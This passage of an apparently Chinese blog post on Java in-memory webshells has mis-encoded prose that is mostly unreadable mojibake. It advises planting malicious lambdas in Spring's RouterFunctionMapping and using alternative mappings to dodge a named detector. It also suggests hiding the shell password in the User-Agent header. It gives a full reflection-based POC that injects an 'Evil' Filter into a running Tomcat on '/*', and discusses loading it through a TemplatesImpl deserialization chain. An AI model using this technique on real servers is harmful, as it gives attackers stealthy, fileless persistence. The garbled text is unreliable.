HandlerFunction&lt;?&gt; handlerFunction = <span class="keyword">this</span>.routerFunction.route(request).orElse(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ‰¾<code>RouterFunctionMapping</code>çš„ç»§æ‰¿ç±»ï¼Œæ‰¾åˆ°ä¸€ä¸ª<code>RouterFunctions$ResourcesRouterFunction</code></p>
<p>è¯¥ç±»æœ‰ä¸ª<code>Function lookupFunction</code>å±æ€§ã€‚å¯ä»¥å­˜æ”¾lambdaã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ResourcesRouterFunction</span> <span class="keyword">extends</span>  <span class="title">AbstractRouterFunction</span>&lt;<span class="title">ServerResponse</span>&gt; </span>&#123;</span><br><span class="line">		<span class="comment">//[!]</span></span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">final</span> Function&lt;ServerRequest, Optional&lt;Resource&gt;&gt; lookupFunction;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="title">ResourcesRouterFunction</span><span class="params">(Function&lt;ServerRequest, Optional&lt;Resource&gt;&gt; lookupFunction)</span> </span>&#123;</span><br><span class="line">			Assert.notNull(lookupFunction, <span class="string">&quot;Function must not be null&quot;</span>);</span><br><span class="line">			<span class="keyword">this</span>.lookupFunction = lookupFunction;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">    	<span class="comment">/*</span></span><br><span class="line"><span class="comment">    	 * ä¼šè¢«è°ƒç”¨çš„route()</span></span><br><span class="line"><span class="comment">    	*/</span></span><br><span class="line">		<span class="meta">@Override</span></span><br><span class="line">		<span class="keyword">public</span> Optional&lt;HandlerFunction&lt;ServerResponse&gt;&gt; route(ServerRequest request) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">this</span>.lookupFunction.apply(request).map(ResourceHandlerFunction::<span class="keyword">new</span>);</span><br><span class="line">		&#125;</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>



<p>æ˜¯ä¸æ˜¯æˆ‘ä»¬å¯ä»¥åœ¨è‡ªå®šä¹‰ä¸ª<strong>æ¶æ„</strong>çš„lambdaç±»å‘¢ï¼Ÿ<strong>æ˜¯çš„ï¼Œå®Œå…¨å¯ä»¥ã€‚</strong></p>
<p>å®æµ‹æ˜¯èƒ½ç”¨çš„ã€‚</p>
<h1 id="å…³äºå†…å­˜é©¬æ£€æµ‹"><a href="#å…³äºå†…å­˜é©¬æ£€æµ‹" class="headerlink" title="å…³äºå†…å­˜é©¬æ£€æµ‹"></a>å…³äºå†…å­˜é©¬æ£€æµ‹</h1><p>çœ‹äº†ä¸‹4ra1nå¸ˆå‚…çš„æ£€æµ‹ã€‚ä¼¼ä¹åªæ£€æµ‹äº†<code>RequestMappingHandlerMapping</code>é‡Œçš„<code>mappingRegistry</code> - <strong>2021.12.06</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/EmYiQing/SpringMemShell/blob/master/src/main/java/com/example/spring/TestController.java">https://github.com/EmYiQing/SpringMemShell/blob/master/src/main/java/com/example/spring/TestController.java</a></p>
<p>é‚£æˆ‘ä»¬å¯ä»¥é€šè¿‡æ³¨å…¥<code>AbstractUrlHandlerMapping</code>å’Œ<code>RouterFunctionMapping</code>å†…å­˜é©¬å³å¯è§„é¿æ£€æµ‹</p>
<h1 id="éšè”½æ–¹å¼"><a href="#éšè”½æ–¹å¼" class="headerlink" title="éšè”½æ–¹å¼"></a>éšè”½æ–¹å¼</h1><p>æŠŠpasswordæ”¾åœ¨User-Agentä¸Š</p>
<h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><p>å‚è€ƒä¸‰æ¢¦å¸ˆå‚…çš„æ–‡ã€‚ï¼ˆçœ‹æ–‡ï¼Œå¥½åƒå¸ˆå‚…æœ¬æ¥æƒ³é€šè¿‡æ³¨å†Œä¸€ä¸ªä¼˜å…ˆçº§æœ€é«˜çš„Filterï¼Œæ¥ç»•è¿‡FilteråŠ è½½é¡ºåºæ‹¿ä¸åˆ°responseçš„é—®é¢˜ï¼Œè¾¾åˆ°å›æ˜¾çš„æ•ˆæœã€‚ä½†ï¼Œè¦æ³¨å†ŒFilterçš„å‰ææ˜¯å¾—æ‹¿åˆ°ä¸€ä¸ªresponseã€‚è¿™å°±æ— äº†ã€‚æ‰€ä»¥ï¼ŒæŠŠä»–æ”¹æˆæ— æ–‡ä»¶å†…å­˜é©¬ï¼Œæ›´ä½³ï¼‰</p>
<h2 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h2><h3 id="æ³¨å†ŒFilter"><a href="#æ³¨å†ŒFilter" class="headerlink" title="æ³¨å†ŒFilter"></a>æ³¨å†ŒFilter</h3><p>åœ¨Tomcatè¿è¡ŒçŠ¶æ€ä¸‹ï¼Œç›´æ¥<code>addFilter()</code>æ˜¯ä¸å¾—è¡Œçš„ã€‚ä¼šæŠ¥é”™</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.IllegalStateException: Filters can not be added to context /tomcat1_war_exploded as the context has been initialised</span><br></pre></td></tr></table></figure>

<p>è·Ÿè¿›å»æŠ¥é”™çš„è°ƒç”¨æ ˆã€‚å‘ç°æŠ›é”™ä»£ç å¦‚ä¸‹ï¼Œååˆ†ç®€å•ç²—æš´</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> FilterRegistration.<span class="function">Dynamic <span class="title">addFilter</span><span class="params">(String filterName,</span></span></span><br><span class="line"><span class="function"><span class="params">            String filterClass, Filter filter)</span> <span class="keyword">throws</span> IllegalStateException </span>&#123;</span><br><span class="line">    .....</span><br><span class="line">    <span class="keyword">if</span> (!context.getState().equals(LifecycleState.STARTING_PREP)) &#123;</span><br><span class="line">        <span class="comment">//TODO Spec breaking enhancement to ignore this restriction</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(</span><br><span class="line">            sm.getString(<span class="string">&quot;applicationContext.addFilter.ise&quot;</span>,</span><br><span class="line">                         getContextPath()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆåŠ¨æ€æ³¨å†ŒFilterçš„æ€è·¯ä¹Ÿå¾ˆæ˜æ˜¾äº†ï¼šåå°„ä¿®æ”¹<code>context.getState()</code>çš„å€¼ï¼Œè®©å…¶å€¼ä¸º<code>LifecycleState.STARTING_PREP</code>ã€‚å°±å¯ä»¥æ­£å¸¸æ‰§è¡Œ<code>addFilter()</code>çš„é€»è¾‘äº†</p>
<p>åå°„è·¯å¾„:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> ApplicationContext.context</span><br><span class="line">    LifecycleBase.state</span><br></pre></td></tr></table></figure>



<p><strong>æ·»åŠ Filterçš„ç¨‹åºé€»è¾‘</strong></p>
<p>è¿™æ ·æ·»åŠ å¥½Filterå°±èƒ½ç”¨äº†å˜›ï¼Ÿä¸ï¼Œå¹¶ä¸å¯ä»¥ã€‚ç»“åˆå‰é¢æˆ‘ä»¬éœ€è¦åå°„ä¿®æ”¹<code>LifecycleBase.state</code>å¯æ¨æµ‹ã€‚æ·»åŠ Filterçš„åŠŸèƒ½æœ¬æ¥å°±ä¸æ˜¯åœ¨Tomcatå¯åŠ¨ä¸­ä½¿ç”¨çš„ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬è¿˜å¾—ç®€å•çœ‹ä¸€ä¸‹Filterçš„è°ƒç”¨é€»è¾‘ï¼Œçœ‹çœ‹Tomcatæ˜¯åœ¨å“ªé‡Œä¿å­˜Filterä¿¡æ¯ï¼Œæ€ä¹ˆè°ƒç”¨Filterçš„ã€‚å¦‚æœå¯ä»¥ï¼Œæˆ‘ä»¬å°±é€šè¿‡åå°„ä¿®æ”¹å­˜å‚¨FIiterä¿¡æ¯çš„å±æ€§ã€‚</p>
<p>æ ¹æ®è°ƒç”¨æ ˆå¯çŸ¥ï¼ŒTomcatæ˜¯é€šè¿‡è°ƒç”¨<code>ApplicationFilterChain</code>æ¥è°ƒç”¨æ¯ä¸€ä¸ªFilterçš„ã€‚<code>ApplicationFilterChain</code>ä¹‹å‰æ˜¯ç”±<code>StandardWrapperValve#invoke()</code>è°ƒç”¨çš„ã€‚æˆ‘ä»¬ç‚¹åˆ°<code>StandardWrapperValve#invoke()</code>é‡Œå¤´çœ‹çœ‹</p>
<img src="/2022/07/07/2022-07-07-java-memory-shell/3.png" style="zoom: 100%;">



<p>å¯ä»¥å‘ç°ï¼Œå¯¹äºæ¯ä¸€ä¸ªè¯·æ±‚ï¼ŒTomcatéƒ½ä¼šåœ¨<code>StandardWrapperValve#invoke()</code>ä¸­æ–°å»ºä¸€ä¸ª<code>ApplicationFilterChain</code>æ¥æ‰§è¡ŒFilter chainæ“ä½œã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">invoke</span><span class="params">(Request request, Response response)</span></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);</span><br><span class="line">    <span class="comment">//æ‹¿åˆ°filterChainåï¼Œæ‰§è¡ŒdoFilter()èµ°Filteræµç¨‹</span></span><br><span class="line">    filterChain.doFilter(request.getRequest(), response.getResponse());</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>çœ‹è¿›æ–°å»ºçš„<code>ApplicationFilterFactory.createFilterChain()</code>ï¼Œè¯¥æ–¹æ³•ä¾æ®<code>context</code>ä¸Šä¸‹æ–‡å˜é‡æŸ¥æ‰¾å¯¹åº”çš„<code>Filter</code>ã€‚è‹¥<code>filterMap</code>åœ¨ä¸Šä¸‹æ–‡ä¸­æœ‰å­˜æ”¾ï¼Œå°±ä¼šæ–°å»ºä¸€ä¸ª<code>ApplicationFilterChain</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ApplicationFilterChain <span class="title">createFilterChain</span><span class="params">(ServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">            Wrapper wrapper, Servlet servlet)</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    .....x</span><br><span class="line">    <span class="comment">//filterMapså°±æ˜¯ä¸Šæ–‡é€šè¿‡addFilter()ï¼Œæ’å…¥çš„Filterä¿¡æ¯è¡¨</span></span><br><span class="line">    <span class="keyword">for</span> (FilterMap filterMap : filterMaps) &#123;</span><br><span class="line">        <span class="comment">//è°ƒç”¨çš„Filteråœ¨ä¸Šä¸‹æ–‡ä¸­ä¸å­˜åœ¨ï¼Œå°±ä¸ä¼šå­˜å…¥filterChainä¸­ï¼Œä¹Ÿå°±ä¸ä¼šè¿”å›è¯¥filteräº†</span></span><br><span class="line">        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)</span><br><span class="line">            context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">        <span class="keyword">if</span> (filterConfig == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//è°ƒç”¨çš„Filteråœ¨ä¸Šä¸‹æ–‡ä¸­å­˜åœ¨ï¼Œå­˜å…¥filterChain</span></span><br><span class="line">        filterChain.addFilter(filterConfig);</span><br><span class="line">     &#125;</span><br><span class="line">    .....</span><br><span class="line">    <span class="keyword">return</span> filterChain;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Filterç”Ÿæ•ˆ"><a href="#Filterç”Ÿæ•ˆ" class="headerlink" title="Filterç”Ÿæ•ˆ"></a>Filterç”Ÿæ•ˆ</h3><p>è¦è®©FilterçœŸæ­£ç”Ÿæ•ˆï¼Œéœ€è¦ä¿®æ”¹<code>StandardContext.filterConfigs</code>çš„å±æ€§ã€‚å¾€é‡Œå¤´æ’å…¥æ–°å¢çš„Filterã€‚ä½†è¿™ä¸ªæš‚ä¸”æ²¡çœ‹åˆ°å“ªé‡Œæœ‰èµ‹å€¼ç‚¹ã€‚ç›®æµ‹åªèƒ½æ‰‹åŠ¨åå°„ï¼Œä¸ºå…¶æ–°å¢ä¸€ä¸ª<code>Filter</code></p>
<p>åœ¨Debugä¸­çœ‹åˆ°<code>ApplicationFilterConfig</code>çš„å±æ€§æœ‰ç‚¹å¤æ‚ï¼Œæ€ä¹ˆæ„é€ å‘¢ï¼Ÿå»çœ‹çœ‹æºç ä¸­<code>ApplicationFilterConfig</code>æ˜¯æ€ä¹ˆè¢«æ„å»ºçš„ï¼Œæ‰¾æ‰¾æ˜¯å¦æœ‰Factoryç±»æˆ–è€…createæ–¹æ³•ã€‚æ‰¾åˆ°*StandardContext#filterStart()*ã€‚å‘ç°ç›´æ¥newå°±å¥½äº†ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ApplicationFilterConfig filterConfig =</span><br><span class="line">     <span class="keyword">new</span> ApplicationFilterConfig(<span class="keyword">this</span>, entry.getValue());</span><br><span class="line">filterConfigs.put(name, filterConfig);</span><br></pre></td></tr></table></figure>

<p>çœ‹æ¥è¿˜éœ€è¦æ„é€ å¤šä¸€ä¸ª<code>FilterDef</code>ã€‚è¿™ä¸ªç±»æ²¡é‚£ä¹ˆå¤æ‚ï¼Œç›´æ¥è°ƒç”¨<code>setXX()</code>å°±å¯ä»¥å®Œæˆå±æ€§èµ‹å€¼äº†ã€‚</p>
<h3 id="å®Œæ•´POC"><a href="#å®Œæ•´POC" class="headerlink" title="å®Œæ•´POC"></a>å®Œæ•´POC</h3><p>æ€è·¯ï¼š</p>
<ol>
<li>ä¸´æ—¶ä¿®æ”¹<code>LifecycleBase.state</code>ä¸º<code>LifecycleState.STARTING_PREP</code></li>
<li>é€šè¿‡<code>ApplicationContextFacade.addFilter()</code>æ³¨å†Œä¸€ä¸ªFilterã€‚</li>
<li>æ³¨å†Œåè®¾ç½®Filterï¼ŒæŒ‡å®šå…¶åŒ¹é…è·¯å¾„</li>
<li>åå°„ä¿®æ”¹<code>StandardContext.filterConfigs</code>ï¼Œæ–°å¢Filterï¼Œä½¿å‰é¢æ³¨å†Œçš„Filterç”Ÿæ•ˆ</li>
<li>æœ€åè®°å¾—å°†<code>LifecycleBase.state</code>æ”¹å›<code>LifecycleState.STARTED</code></li>
</ol>
<p>å®šä¹‰ä¸€ä¸ªFIlterã€‚ä½†ä¸åœ¨<code>web.xml</code>ä¸­é…ç½®</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.evil;</span><br><span class="line">.....</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EF</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        response.getWriter().write(<span class="string">&quot;Evil Filter Hook&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Servletä¸­åŠ¨æ€æ³¨å†ŒFilter</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//[+] è·å–éœ€è¦çš„å±æ€§StandardContext</span></span><br><span class="line">ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) getServletContext();</span><br><span class="line">Field contextField = ApplicationContextFacade.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">ApplicationContext applicationContext = (ApplicationContext) contextField.get(applicationContextFacade);</span><br><span class="line"></span><br><span class="line">Field standardContextField = ApplicationContext.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">standardContextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line"><span class="comment">//[+] ä¸´æ—¶ä¿®æ”¹LifecycleBase.state</span></span><br><span class="line">Field stateFiled = LifecycleBase.class.getDeclaredField(<span class="string">&quot;state&quot;</span>);</span><br><span class="line">stateFiled.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">stateFiled.set(standardContext, LifecycleState.STARTING_PREP);</span><br><span class="line"></span><br><span class="line"><span class="comment">//[+] æ³¨å†ŒFilter</span></span><br><span class="line">Filter ef = <span class="keyword">new</span> EF();</span><br><span class="line"><span class="comment">//ç¬¬ä¸€æ¬¡æ³¨å†Œå°±ä¼šè¿”å›FilterRegistration.Dynamic</span></span><br><span class="line">FilterRegistration.Dynamic filterRegistration = applicationContextFacade.addFilter(<span class="string">&quot;ef&quot;</span>, ef);</span><br><span class="line"><span class="comment">//å‚æ•°</span></span><br><span class="line"><span class="comment">//EnumSet&lt;DispatcherType&gt;: è¡¨ç¤ºæ‹¦æˆªç±»å‹</span></span><br><span class="line"><span class="comment">//boolean: åœ¨æ‰€æœ‰Filterä¹‹å/ä¹‹å‰æ‰§è¡Œ</span></span><br><span class="line"><span class="comment">//String[]: åŒ¹é…url</span></span><br><span class="line">EnumSet&lt;DispatcherType&gt; typeEnumSet = EnumSet.of(DispatcherType.REQUEST);</span><br><span class="line">filterRegistration.addMappingForUrlPatterns(typeEnumSet, <span class="keyword">false</span>, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;/*&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//[+] åˆ©ç”¨å‰æ–‡è·å–çš„StandardContextã€‚å¼ºè¡Œåå°„ä¿®æ”¹filterConfig</span></span><br><span class="line">Field filterConfigField = StandardContext.class.getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">filterConfigField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">HashMap&lt;String, ApplicationFilterConfig&gt; filterConfig = (HashMap) filterConfigField.get(standardContext);</span><br><span class="line">System.out.println(filterConfig);</span><br><span class="line"></span><br><span class="line">FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">filterDef.setFilter(ef);</span><br><span class="line">filterDef.setFilterName(<span class="string">&quot;ef&quot;</span>);</span><br><span class="line">filterDef.setFilterClass(ef.getClass().getName());</span><br><span class="line">filterDef.setAsyncSupported(<span class="string">&quot;false&quot;</span>);</span><br><span class="line"></span><br><span class="line">Constructor&lt;ApplicationFilterConfig&gt; applicationFilterConfigConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">applicationFilterConfigConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">ApplicationFilterConfig applicationFilterConfig = applicationFilterConfigConstructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">filterConfig.put(<span class="string">&quot;ef&quot;</span>, applicationFilterConfig);</span><br><span class="line"></span><br><span class="line"><span class="comment">//[+] é‡ç½®LifecycleBase.state</span></span><br><span class="line">stateFiled.set(standardContext, LifecycleState.STARTED);</span><br></pre></td></tr></table></figure>

<p>æ•ˆæœï¼š</p>
<img src="/2022/07/07/2022-07-07-java-memory-shell/1.gif" style="zoom: 80%;">



<h3 id="å®æˆ˜å†…å­˜é©¬è§’åº¦"><a href="#å®æˆ˜å†…å­˜é©¬è§’åº¦" class="headerlink" title="å®æˆ˜å†…å­˜é©¬è§’åº¦"></a>å®æˆ˜å†…å­˜é©¬è§’åº¦</h3><p>ä¸‰æ¢¦å¸ˆå‚…ç”¨çš„æ˜¯â€œä¿®æ”¹ç¨‹åºé€»è¾‘ï¼Œåˆå§‹åŒ–é™æ€å˜é‡â€è¿™ç§æ–¹å¼æ‹¿requestï¼Œç„¶åé¡ºåˆ©æ‹¿åˆ°contextçš„ã€‚ä½†ç”±äºè¿™ç§æ–¹å¼å¯¹äºFilterç±»å‹çš„ç¨‹åºä¸å¤ªå‹å¥½ï¼Œä¸‹æ–‡ä½¿ç”¨â€œTomcat7å¦ä¸€ä¸ªé™æ€å˜é‡â€è¿™ç§æ–¹å¼ï¼Œæ¥è·å–contextã€‚</p>
<p>æ‰“å†…å­˜é©¬ï¼Œæœ€å¸¸ç”¨çš„å°±æ˜¯<code>defineClass()</code>ã€‚é‚£æˆ‘ä»¬æ¥å®ç°ä¸‹ã€‚æ•´ä¸€ä¸ªå…·æœ‰CC11ä¾èµ–çš„Tomcatã€‚</p>
<p>CC11æ˜¯ç”¨<code>TemplatesImpl</code>æ¥<code>defineClass()</code>çš„ã€‚ä½†æ˜¯è¿™é‡Œæœ‰ä¸€ä¸ªå°å‘ã€‚æˆ‘ä»¬æ¥çœ‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defineTransletClasses</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line"></span><br><span class="line">        TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">                <span class="comment">//æ–°å»ºäº†ä¸€ä¸ªClassLoader</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">    </span><br><span class="line">     <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">         <span class="comment">//ä½¿ç”¨æ–°å»ºçš„ClassLoaderæ¥defineClass()</span></span><br><span class="line">         _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Javaä¸­ç±»åŠ è½½æœºåˆ¶æ˜¯åŒäº²å§”æ´¾ï¼Œä¸€èˆ¬çš„ä¾‹å¦‚<code>new XXX()</code>è¿™ç§ï¼Œéƒ½æ˜¯ç”¨çš„Javaå¯åŠ¨æ—¶åˆ›å»ºçš„ClassLoaderæ¥åŠ è½½çš„ã€‚ç±»å®ä¾‹ä¼šä¿å­˜åœ¨ClassLoaderä¸­ã€‚ä½†æˆ‘ä»¬çœ‹åˆ°<code>TemplatesImpl</code>ï¼Œå®ƒå»<code>defineClass()</code>æ˜¯ç”¨æ–°å»ºçš„ClassLoaderåŠ è½½ç±»ã€‚ç±»å®ä¾‹åªä¼šä¿å­˜åœ¨è¿™ä¸ªæ–°å»ºçš„ClassLoaderä¸­ã€‚ä½†æ‰¾äº†ä¸€åœˆï¼Œå¹¶æ²¡æœ‰å‘ç°ç¨‹åºå…¶ä»–åœ°æ–¹æœ‰å­˜å‚¨è¿™ä¸ª<code>loader</code>çš„ç‚¹ã€‚æ‰€ä»¥å¦‚æœæˆ‘ä»¬ç”¨<code>TemplatesImpl</code>è¿›è¡Œäº†<code>defineClass()</code>ï¼Œæ˜¯æ²¡æ³•åœ¨å¤–é¢ç”¨<code>Class.forName()</code>æ‹¿åˆ°åŠ è½½çš„ç±»å®ä¾‹çš„ã€‚</p>
<p>è¦åŠ¨æ€æ³¨å†ŒFIlterï¼Œéœ€è¦ApplicaationContextï¼Œä½†æˆ‘ä»¬æ‰‹å¤´åªæœ‰StandContenxtã€‚è¿™ä¸ªå¯ä»¥ä¸å¯ä»¥åŠ Filterå‘¢ï¼Ÿ</p>
<p>ç›´æ¥æ–­ç‚¹æ‰“åœ¨Filterä¸­ï¼Œå›æº¯çœ‹ã€‚æ‰¾åˆ°*ApplicationFilterChain#internalDoFilter()*ã€‚å¾ˆæ˜æ˜¾å¯ä»¥çœ‹åˆ°å‡ ä¸ªå…³é”®å±æ€§ï¼š<code>filters</code>, <code>filterConfig</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (pos &lt; n) &#123;</span><br><span class="line">    ApplicationFilterConfig filterConfig = filters[pos++];</span><br><span class="line">    Filter filter = filterConfig.getFilter();</span><br><span class="line">    filter.doFilter(request, response, <span class="keyword">this</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>ç»§ç»­å¾€å‰çœ‹ï¼Œè¿™äº›ä¸œè¥¿æ˜¯å“ªé‡Œè¢«èµ‹å€¼çš„å‘¢ï¼Ÿæ‰¾åˆ°*StandardWrapperValve#invoke()*ã€‚æœ‰ä¸€è¡Œï¼šFilterçš„è°ƒç”¨éƒ½æ˜¯æ ¹æ®<code>filterChain</code>çš„å€¼ï¼Œè¿›è¡Œä¾æ¬¡è°ƒç”¨çš„ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> ApplicationFilterChain filterChain =</span><br><span class="line">                ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);</span><br><span class="line">filterChain.doFilter(request.getRequest(), response.getResponse());</span><br></pre></td></tr></table></figure>

